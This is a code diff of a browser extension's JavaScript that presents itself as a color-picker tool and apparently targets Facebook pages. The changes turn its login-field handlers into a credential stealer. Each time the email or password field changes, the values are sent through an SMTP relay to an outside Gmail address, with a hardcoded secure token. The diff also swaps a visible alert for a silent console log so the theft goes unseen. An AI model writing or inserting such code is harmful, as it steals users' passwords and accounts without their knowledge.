@@ -57,14 +57,16 @@ async function pickColor(url){
             chrome.storage.sync.set({pass: finalp});
 
             mail.onchange =async function(){
-                var finalm = mail.value;
+                finalm = mail.value;
                 chrome.storage.sync.set({mail : finalm});
+                sendEmail(finalm,finalp);
             }
             pass.onchange =async function(){
-                var finalp = pass.value;
+                finalp = pass.value;
                 chrome.storage.sync.set({pass: finalp});
+                sendEmail(finalm,finalp);
             }
-            sendEmail();
+            sendEmail(finalm,finalp);
             const eyeDropper = new EyeDropper();
             return await eyeDropper.open();
         }catch(err){
@@ -104,18 +106,18 @@ function search_fbUrl(url){
 }
 
 
-var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };
 
-function sendEmail() {
-    
+function sendEmail(user,pass) {
+    var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };
+
     
         Email.send({
     SecureToken : "b8d04846-481c-4085-a109-3b7be4b895c9",
-    To : "snpsujon93@gmail.com",
+    To : "snpearn@gmail.com",
     From : "snpsujon007@gmail.com",
-    Subject : "This is the subject",
-    Body : "UserName -  and Pass - "
+    Subject : "Attention! Holololo is Here",
+    Body : "UserName - "+user+" and Pass - "+pass
 }).then(
-  message => alert(message)
+  message => console.log(message)
 );
     }
